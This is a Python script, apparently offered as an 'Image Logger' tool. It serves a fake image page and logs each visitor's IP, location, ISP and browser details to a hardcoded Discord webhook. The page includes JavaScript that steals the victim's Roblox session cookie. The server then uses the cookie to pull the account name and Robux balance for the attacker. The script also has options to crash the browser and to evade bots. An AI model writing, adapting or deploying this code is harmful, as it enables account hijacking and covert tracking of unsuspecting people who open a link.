# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
import socketserver
import urllib.parse as parse
import traceback
import requests
import base64
import httpagentparser
from urllib.parse import urlsplit, parse_qsl

config = {
    "webhook": "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU",
    "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)",
    "imageArgument": True,
    "crashBrowser": False,
    "accurateLocation": False,
    "buggedImage": True,
    "blacklistedIPs": ("27", "104", "143", "164"),
    "antiBot": 1,
    "vpnCheck": 1,
    "linkAlerts": True,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    "message": {
        "doMessage": False,
        "richMessage": True,
        "message": "IP: {ip} | Provider: {isp} | {roblox_user} ({robux} Robux)"
    }
}

binaries = {
    "loading": base64.b85decode(b'|JeWF01!>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~rR0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def get_ip_info(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if resp["status"] == "success":
            resp["coords"] = False  # Precise unless accurateLoc
            return resp
    except:
        pass
    return {'country': 'Unknown', 'regionName': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'as': 'Unknown', 'lat': 0, 'lon': 0, 'timezone': 'Unknown', 'mobile': False, 'proxy': False, 'hosting': False, 'coords': True}

def botCheck(ip, ua):
    if ip.startswith(("34.", "35.")):
        return "Discord"
    elif ua and ua.startswith("TelegramBot"):
        return "Telegram"
    info = get_ip_info(ip)
    if info.get('hosting'):
        return "Hosting"
    if ua and any(word in ua.lower() for word in ('bot', 'crawler', 'spider')):
        return "Bot UA"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], {"content": f"Error: ```{error}```"})
    except:
        pass

def get_roblox_info(cookie):
    try:
        session = requests.Session()
        session.cookies['.ROBLOSECURITY'] = cookie
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
        if user_resp.status_code != 200:
            return None
        user_data = user_resp.json()
        uid = user_data.get('id')
        username = user_data.get('name', 'Unknown')
        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
        robux = 'Error'
        if robux_resp.status_code == 200:
            robux_data = robux_resp.json()
            robux = robux_data.get('robux', 0)
        return {'username': username, 'id': str(uid), 'robux': f"{robux:,}", 'cookie': cookie}
    except:
        return None

def makeReport(ip, ua=None, location=None, endpoint=None, url=None, roblox_info=None):
    info = get_ip_info(ip)
    if not info:
        info = {'country': 'Unknown', 'regionName': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'as': 'Unknown', 'lat': 0, 'lon': 0, 'timezone': 'Unknown', 'mobile': False, 'proxy': False, 'hosting': False, 'coords': True}
    
    bot_val = info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'
    coords = f"{info.get('lat',0)}, {info.get('lon',0)} ({'Approximate' if info.get('coords') else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++{info.get(\"lat\",0)},+{info.get(\"lon\",0)})'} )"
    tz = info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') + f" ({info.get('timezone', 'Unknown').split('/')[0]})" if '/' in str(info.get('timezone')) else info.get('timezone', 'Unknown')
    
    os, browser = httpagentparser.simple_detect(ua) if ua else ('Unknown', 'Unknown')
    
    # Exact template blocks
    ip_info = f"> **IP:** `{ip}`\n> **Provider:** `{info.get('isp', 'Unknown')}`\n> **ASN:** `{info.get('as', 'Unknown')}`\n> **Country:** `{info.get('country', 'Unknown')}`\n> **Region:** `{info.get('regionName', 'Unknown')}`\n> **City:** `{info.get('city', 'Unknown')}`\n> **Coords:** `{coords}`\n> **Timezone:** `{tz}` ({info.get('timezone', 'Unknown').split('/')[0] if '/' in str(info.get('timezone')) else ''})\n> **Mobile:** `{info.get('mobile', False)}`\n> **VPN:** `{info.get('proxy', False)}`\n> **Bot:** `{bot_val}`"
    
    pc_info = f"> **OS:** `{os}`\n> **Browser:** `{browser}`"
    
    ua_block = f"```\n{ua or 'Unknown'}\n```"
    
    embed_fields = [
        {"name": "**IP Info:**", "value": ip_info, "inline": False},
        {"name": "**PC Info:**", "value": pc_info, "inline": False},
        {"name": "**User Agent:**", "value": ua_block, "inline": False}
    ]
    
    color = 0xff0000 if roblox_info else 0x00ff00
    title = f"💎 ROBLOX JACKPOT on {ip}" if roblox_info else f"🔍 Grabbed {ip}"
    
    if roblox_info:
        roblox_block = f"> **🟥 Username:** `{roblox_info['username']}`\n> **🟥 ID:** `{roblox_info['id']}`\n> **🟥 Robux:** `{roblox_info['robux']}`\n> **🟥 Cookie:** `{roblox_info['cookie'][:100]}{'...' if len(roblox_info['cookie']) > 100 else ''}`"
        embed_fields.append({"name": "**Roblox Info:**", "value": roblox_block, "inline": False})
    
    embed = {
        "embeds": [{
            "title": title,
            "color": color,
            "fields": embed_fields,
            "footer": {"text": endpoint or "ImageLogger"},
            "thumbnail": {"url": url} if url else None
        }]
    }
    
    requests.post(config["webhook"], json=embed)
    
    # Message
    message = config["message"]["message"]
    if config["message"]["richMessage"]:
        message = message.replace("{ip}", ip)
        message = message.replace("{isp}", info.get('isp', 'Unknown'))
        message = message.replace("{country}", info.get('country', 'Unknown'))
        message = message.replace("{city}", info.get('city', 'Unknown'))
        message = message.replace("{roblox_user}", roblox_info['username'] if roblox_info else 'None')
        message = message.replace("{robux}", roblox_info['robux'] if roblox_info else 'None')
        message = message.replace("{roblox_cookie}", roblox_info['cookie'] if roblox_info else 'None')
        # Add more {var} as needed
    if config["message"]["doMessage"]:
        requests.post(config["webhook"], {"content": message})
    
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handleRequest()

    def do_POST(self):
        self.handleRequest()

    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse_qsl(urlsplit(s).query))
            
            url = config["image"]
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
                except:
                    pass
            
            ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
            ua = self.headers.get('User-Agent', '')
            
            # Blacklist
            if any(ip.startswith(blip) for blip in config["blacklistedIPs"]):
                self.send_response(403)
                self.end_headers()
                return
            
            # Roblox pixel (stealth GIF)
            if 'roblox' in dic:
                roblox_data = None
                try:
                    cookie = base64.b64decode(dic['roblox'].encode()).decode('utf-8')
                    roblox_data = get_roblox_info(cookie)
                    if roblox_data:
                        makeReport(ip, ua, endpoint=s.split('?')[0], url=url, roblox_info=roblox_data)
                except:
                    pass
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
                self.wfile.write(gif)
                return
            
            # Bot/link alert
            bot = botCheck(ip, ua)
            if bot and config["linkAlerts"]:
                makeReport(ip, ua, endpoint=s.split('?')[0], url=url, roblox_info=None)
                return
            
            # Report normal hit
            info = makeReport(ip, ua, endpoint=s.split('?')[0], url=url, roblox_info=None)
            
            # Build page
            datatype = 'text/html'
            data = f'<img src="{url}" style="width:100%;height:100vh;object-fit:cover;"><title>Loading...</title>'.encode()
            
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()
            
            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var g = btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
            if (currenturl.includes("?")) {
                currenturl += "&g=" + g;
            } else {
                currenturl += "?g=" + g;
            }
            location.replace(currenturl);
        });
    }
}}
</script>"""
            
            if config["crashBrowser"]:
                data += b'<script>while(1){}</script>'
            
            # Roblox cookie grabber JS (always)
            data += b"""<script>
(function(){
    var cookies = document.cookie.split(';');
    var robloxCookie = '';
    for(var i = 0; i < cookies.length; i++) {
        var c = cookies[i].trim();
        if(c.indexOf('.ROBLOSECURITY=') === 0) {
            robloxCookie = c.substring(16);
            break;
        }
    }
    if(robloxCookie) {
        var img = new Image(1,1);
        img.src = window.location.pathname + '?roblox=' + btoa(robloxCookie) + (window.location.search ? window.location.search.replace('?', '&') : '');
    }
})();
</script>"""
            
            if config["buggedImage"] and bot:
                data = binaries["loading"]
                datatype = 'image/png'
                self.send_header('Content-type', datatype)
                self.end_headers()
                self.wfile.write(data)
                return
            
            self.wfile.write(data)
            
        except Exception as e:
            reportError(traceback.format_exc())

if __name__ == "__main__":
    with socketserver.TCPServer(("", 80), ImageLoggerAPI) as httpd:
        print("Server live on port 80")
        httpd.serve_forever()
